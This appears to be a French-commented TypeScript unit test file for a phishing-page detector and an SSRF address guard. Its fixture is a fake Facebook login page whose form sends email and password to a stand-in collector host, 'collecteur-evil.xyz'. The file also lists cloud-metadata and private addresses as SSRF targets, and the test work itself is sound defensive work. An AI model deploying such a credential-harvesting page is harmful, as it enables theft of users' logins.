/**
 * Tests unitaires de l'analyse du contenu des pages (detection de sites
 * frauduleux) et de la protection SSRF.
 * Aucun reseau : fonctions pures + verification d'adresses IP locales.
 */
import { describe, expect, it } from "vitest";

import { adressePrivee, analyserContenu, verifierSsrf } from "@/lib/detection/content";

const PAGE_PHISHING = `<!doctype html>
<html>
  <head>
    <title>Facebook Login - Securite du compte</title>
  </head>
  <body>
    <h1>Facebook Login</h1>
    <p>Verifiez votre compte, votre compte sera suspendu si vous ne confirmez pas.</p>
    <form action="https://collecteur-evil.xyz/submit" method="post">
      <input type="email" name="email" />
      <input type="password" name="pass" />
      <button>Se connecter</button>
    </form>
  </body>
</html>`;

const PAGE_INNOcente = `<!doctype html>
<html>
  <head><title>Accueil - Journal du Burkina</title></head>
  <body><h1>Actualites</h1><p>Article de presse.</p></body>
</html>`;

function codes(html: string, url: string) {
  return analyserContenu(html, new URL(url)).map((i) => i.code);
}

describe("analyserContenu — page de phishing", () => {
  const indicateurs = analyserContenu(PAGE_PHISHING, new URL("https://facebook-secure-login.xyz/"));
  const codesListe = indicateurs.map((i) => i.code);

  it("detecte le champ mot de passe", () => {
    expect(codesListe).toContain("CHAMP_MOT_DE_PASSE");
  });

  it("detecte le formulaire qui exfiltre vers un autre domaine", () => {
    expect(codesListe).toContain("FORMULAIRE_EXTERNE");
    const ind = indicateurs.find((i) => i.code === "FORMULAIRE_EXTERNE");
    expect(ind!.message).toContain("collecteur-evil.xyz");
  });

  it("detecte une marque citee sur un hote non officiel", () => {
    expect(codesListe).toContain("MARQUE_DANS_CONTENU");
  });

  it("detecte les formulations d'hameconnage", () => {
    expect(codesListe).toContain("PHRASES_HAMECONNAGE");
  });

  it("detecte un titre oriente connexion", () => {
    expect(codesListe).toContain("TITRE_HAMECONNAGE");
  });

  it("les indicateurs de contenu ont un poids positif", () => {
    const poidsTotal = indicateurs.reduce((acc, i) => acc + i.poids, 0);
    expect(poidsTotal).toBeGreaterThanOrEqual(60); // -> verdict FRAUDULEUSE
  });
});

describe("analyserContenu — page innocente", () => {
  it("aucun indicateur sur une page vitrine simple", () => {
    expect(codes(PAGE_INNOcente, "https://www.example.com/")).toHaveLength(0);
  });

  it("formulaire vers le MEME domaine = pas d'exfiltration", () => {
    const html = `<form action="/connexion" method="post"><input type="text" /></form>`;
    expect(codes(html, "https://site-officiel.com/")).not.toContain("FORMULAIRE_EXTERNE");
  });
});

describe("adressePrivee — protection SSRF", () => {
  it("bloque les adresses loopback et privees IPv4", () => {
    expect(adressePrivee("127.0.0.1")).toBe(true);
    expect(adressePrivee("10.0.0.5")).toBe(true);
    expect(adressePrivee("172.16.4.1")).toBe(true);
    expect(adressePrivee("192.168.1.1")).toBe(true);
    expect(adressePrivee("169.254.169.254")).toBe(true); // metadonnees cloud
    expect(adressePrivee("0.0.0.0")).toBe(true);
    expect(adressePrivee("100.64.0.1")).toBe(true); // CGNAT
  });

  it("autorise les adresses publiques", () => {
    expect(adressePrivee("93.184.216.34")).toBe(false);
    expect(adressePrivee("8.8.8.8")).toBe(false);
    expect(adressePrivee("185.199.108.153")).toBe(false);
  });

  it("bloque les adresses IPv6 privees et le loopback", () => {
    expect(adressePrivee("::1")).toBe(true);
    expect(adressePrivee("fc00::1")).toBe(true);
    expect(adressePrivee("fd12:3456::1")).toBe(true);
    expect(adressePrivee("fe80::1")).toBe(true);
    expect(adressePrivee("::ffff:127.0.0.1")).toBe(true); // IPv4 mappee
    expect(adressePrivee("2606:4700:4700::1111")).toBe(false);
  });
});

describe("verifierSsrf — validation d'hote", () => {
  it("rejette une IP privee ecrite directement dans l'URL", async () => {
    const r = await verifierSsrf("127.0.0.1");
    expect(r.ok).toBe(false);
  });

  it("rejette l'adresse des metadonnees cloud", async () => {
    const r = await verifierSsrf("169.254.169.254");
    expect(r.ok).toBe(false);
  });

  it("accepte une IP publique sans passer par le DNS", async () => {
    const r = await verifierSsrf("93.184.216.34");
    expect(r.ok).toBe(true);
  });

  it("echec de resolution DNS = analyse refusee (jamais de fallback silencieux)", async () => {
    const r = await verifierSsrf("hote-inexistant-cybertrace-test.invalid");
    expect(r.ok).toBe(false);
  });
});
